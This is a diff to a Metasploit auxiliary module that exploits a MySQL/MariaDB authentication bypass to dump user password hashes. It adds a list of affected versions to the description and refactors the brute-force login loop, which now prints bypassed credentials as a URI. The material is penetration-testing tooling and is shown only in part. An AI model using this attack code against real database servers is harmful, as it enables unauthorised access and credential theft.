@@ -13,9 +13,20 @@ class MetasploitModule < Msf::Auxiliary
     super(
       'Name'           => 'MySQL Authentication Bypass Password Dump',
       'Description'    => %Q{
-          This module exploits a password bypass vulnerability in MySQL in order
+        This module exploits a password bypass vulnerability in MySQL in order
         to extract the usernames and encrypted password hashes from a MySQL server.
         These hashes are stored as loot for later cracking.
+
+        Impacts MySQL versions:
+        - 5.1.x before 5.1.63
+        - 5.5.x before 5.5.24
+        - 5.6.x before 5.6.6
+
+        And MariaDB versions:
+        - 5.1.x before 5.1.62
+        - 5.2.x before 5.2.12
+        - 5.3.x before 5.3.6
+        - 5.5.x before 5.5.23
       },
       'Author'        => [
           'theLightCosine', # Original hashdump module
@@ -50,11 +61,10 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       socket = connect(false)
-      x = ::RbMysql.connect(rhost, username, password, nil, rport, socket)
-      x.connect
-      results << x
+      mysql_client = ::RbMysql.connect(rhost, username, password, nil, rport, socket)
+      results << mysql_client
 
-      print_good "#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password"
+      print_good "#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
 
     rescue RbMysql::HostNotPrivileged
       print_error "#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)"
@@ -103,17 +113,17 @@ class MetasploitModule < Msf::Auxiliary
           begin
             # Create our socket and make the connection
             s = connect(false)
-            x = ::RbMysql.connect(rhost, username, password, rport, s)
+            mysql_client = ::RbMysql.connect(rhost, username, password, nil, rport, s)
+
             print_good "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
-            results << x
+            results << mysql_client
           rescue RbMysql::AccessDeniedError
-          rescue Exception => e
+          rescue ::Exception => e
             print_bad "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
           end
         end
 
         cur_threads << t
-
       end
 
       # We can stop if we get a valid login
